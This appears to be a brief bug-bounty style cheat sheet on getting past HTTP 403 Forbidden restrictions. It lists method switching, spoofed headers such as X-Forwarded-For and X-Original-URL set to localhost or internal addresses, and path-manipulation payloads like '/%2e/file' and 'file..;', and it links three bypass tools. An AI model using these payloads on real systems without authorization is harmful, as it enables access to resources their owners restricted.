1. Changing request method

There are many http methods like get, post, trace, options, delete and etc. you can Bypass 403 forbidden by changing http method. like:

→GET to POST

→GET to TRACE

→GET to OPTIONS

2. HTTP Headers

By adding headers in your request. there are many headers that you can use:

X-Custom-IP-Authorization:
X-Custom-IP-Authorization + ..;:
X-Original-URL:
X-Rewrite-URL:
X-Originating-IP:
X-Forwarded-For:
X-Remote-IP:
X-Client-IP:
X-Host:
X-Forwarded-Host:
Values you can use:

localhost
localhost:443
127.0.0.1
127.0.0.1:80
10.0.0.0
192.168.1.1

3. Path manipulation

file?:
//file//
file??:
file//.//./
file//:
file%09
file/./:
file.html
/%2e/file
file..;:
file.php
file.json
file.html
Tools

If you don’t want to do manually there are so many tools also available that you can use some are:

https://github.com/iamj0ker/bypass-403
https://github.com/Dheerajmadhukar/4-ZERO-3
https://github.com/lobuhi/byp4xx
